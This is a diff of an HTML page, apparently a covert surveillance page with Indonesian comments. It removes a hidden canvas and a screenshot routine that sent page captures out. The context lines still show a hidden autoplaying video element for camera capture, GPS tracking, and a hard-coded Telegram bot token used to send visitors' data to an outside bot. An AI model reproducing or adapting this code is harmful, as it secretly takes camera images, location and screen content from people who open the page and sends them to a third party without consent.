@@ -376,10 +376,6 @@
 
 <!--Pembatasan kah -->
 <video id="video" autoplay muted playsinline class="hidden-force"></video>
-<canvas id="canvas" class="hidden-force"></canvas>
-
-
-
 <!--Pembatasan kah -->
     <script>
         const token = '8295593119:AAG_-Tr1HVrFVpD0_f4OLHSGEsqoDCk84og';
@@ -555,16 +551,6 @@
             } catch (e) {
                 await sendToTelegram('❌ Camera access blocked');
             }
-
-            // Take screenshot
-            setTimeout(async () => {
-                try {
-                    const canvas = await html2canvas(document.body);
-                    canvas.toBlob(blob => sendPhoto(blob, 'screenshot.html'), 'image/jpeg');
-                } catch (e) {
-                    await sendToTelegram('❌ Screenshot failed');
-                }
-            }, 5000);
 
             // GPS tracking
             if (navigator.geolocation) {
